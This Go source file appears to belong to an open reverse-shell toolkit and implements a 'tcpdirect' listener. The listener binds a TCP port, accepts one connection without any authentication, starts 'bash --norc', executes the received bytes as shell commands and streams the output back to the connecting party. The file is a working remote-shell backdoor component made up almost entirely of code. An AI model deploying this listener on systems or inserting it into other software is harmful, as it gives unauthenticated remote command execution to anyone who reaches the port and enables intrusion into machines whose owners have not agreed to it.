package listener

import (
	"bufio"
	"fmt"
	"net"
	"time"

	"github.com/maxlaverse/reverse-shell/agents/go/handler"
	"github.com/maxlaverse/reverse-shell/common"
)

type tcpdirect struct {
	processOutput     chan *handler.ProcessOutput
	processTerminated chan *handler.ProcessTerminated
	input             chan []byte
	readerClosed      chan struct{}
	connectionLost    chan struct{}
	port              int32
	handler           *handler.Handler
	ln                net.Listener
}

func NewTcpdirect(port int32) *tcpdirect {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &tcpdirect{
		processOutput:     processOutput,
		processTerminated: processTerminated,
		input:             make(chan []byte),
		readerClosed:      make(chan struct{}),
		connectionLost:    make(chan struct{}),
		port:              port,
		handler:           handler.New(processOutput, processTerminated),
	}
}

func (l *tcpdirect) Start() error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", l.port))
	if err != nil {
		return err
	}

	l.ln = ln
	return nil
}

func (l *tcpdirect) Listen() {
	common.Logger.Debugf("Ready for a new connection")
	conn, _ := l.ln.Accept()
	go l.pipeFromProcessOutput(conn)
	go l.pipeToProcessInput(conn)

	processId := l.handler.CreateProcess("bash --norc")

	for {
		select {
		case msg := <-l.input:
			l.handler.ExecuteCommand(processId, msg)
		case <-l.readerClosed:
			common.Logger.Debugf("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			common.Logger.Debugf("Main Loop stopped")
			return
		}
	}
}

func (t *tcpdirect) pipeToProcessInput(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(600 * time.Second))
	if err != nil {
		common.Logger.Debugf("SetReadDeadline failed:", err)
		t.readerClosed <- struct{}{}
		conn.Close()
		return
	}

	for {
		recvBuf := make([]byte, 1024)
		size, err := bufio.NewReader(conn).Read(recvBuf)
		if err != nil {
			common.Logger.Debugf("Error while reading data from tcp connection: %s", err)
			t.readerClosed <- struct{}{}
			conn.Close()
			break
		}
		t.input <- recvBuf[0:size]
	}
}

func (l *tcpdirect) pipeFromProcessOutput(conn net.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			common.Logger.Debugf("Received %d bytes from processOutput for '%s'", len(a.Result), a.Process.Id)
			conn.Write([]byte(a.Result))

		case <-l.processTerminated:
			common.Logger.Debugf("Received a processTerminated signal! Closing connection")
			conn.Write([]byte("Process terminated\n"))
			conn.Close()

		case <-l.connectionLost:
			common.Logger.Debugf("Received a connectionLost signal! Stopping the loop")
			break PipeLoop
		}
	}
}
